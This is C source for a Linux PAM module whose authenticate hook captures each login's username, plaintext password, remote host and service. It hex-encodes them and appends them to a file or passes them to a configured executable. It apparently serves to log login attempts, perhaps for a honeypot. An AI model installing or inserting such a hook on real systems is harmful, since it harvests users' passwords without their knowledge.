#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
//#include <sys/types.h>
#include <sys/wait.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

//function to convert ascii char[] to hex-string (char[])
void string2hexString(char* input, char* output)
{
    int loop;
    int i;
    i=0;
    loop=0;

    while(input[loop] != '\0')
    {
        sprintf((char*)(output+i),"%02X", input[loop]);
        loop+=1;
        i+=2;
    }
    //insert NULL at the end of the output string
    output[i++] = '\0';
}



/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	const char* pUsername;
	const void* pPassword1;
	const void* rhost1;
	const void* svc1;
	size_t sz;
//	char ascii_str[100];

	pam_get_user(pamh, &pUsername, "Username: ");  
	pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&pPassword1, NULL);    
	pam_get_item(pamh, PAM_AUTHTOK, &pPassword1);
	pam_get_item(pamh, PAM_RHOST, &rhost1);
	pam_get_item(pamh, PAM_SERVICE, &svc1);

// Flipping Variables around so compiler doesnt complain had to cast them as void instead of char- Probably not needed.
	const char* pPassword = pPassword1;
	const char* rhost = rhost1;
	const char* svc = svc1; 

// Search String for Newline (This happens when the user doesnt have an account on the sytem), the password cannot be retrieved.
// I do this to pretty up the output when the user account doesnt exist
	char *nl = strchr(pPassword, '\n');
    if (nl){
    	pPassword = "LoginNotAllowed-Or-UserDoesntExist";
    }
//Convert to hex (Dont Ask!)
	sz = snprintf(NULL, 0, "%s\n%s\n%s\n%s\n", pUsername, pPassword, rhost, svc);
	char ascii_str[sz];
	sprintf(ascii_str, "%s\n%s\n%s\n%s\n", pUsername, pPassword, rhost, svc);
	int len = strlen(ascii_str);
	char hex_str[(len*2)+1];
	string2hexString(ascii_str, hex_str);
//If "file" specified on config line then write string to file.
	if (strcmp(argv[0], "file") == 0){
		FILE *fptr;
   		fptr = fopen(argv[1], "a");
		fprintf(fptr, "%s\n", hex_str);
		fclose(fptr);
	}
//If "exec" specified on config line then pass line to specified executable
//Have to do all this PID and waiting stuff because exec doesnt return.
	if (strcmp(argv[0], "exec") == 0){

		pid_t parent = getpid();
        pid_t pid = fork();
		if (pid == -1){
    		// error, failed to fork()
		}
		else if (pid > 0){
    		int status;
    		waitpid(pid, &status, 0);
		}
		else {
    		execl(argv[1], argv[1], hex_str, NULL);
    		_exit(EXIT_FAILURE);   // exec never returns
		}
	}

	return PAM_AUTH_ERR;
}
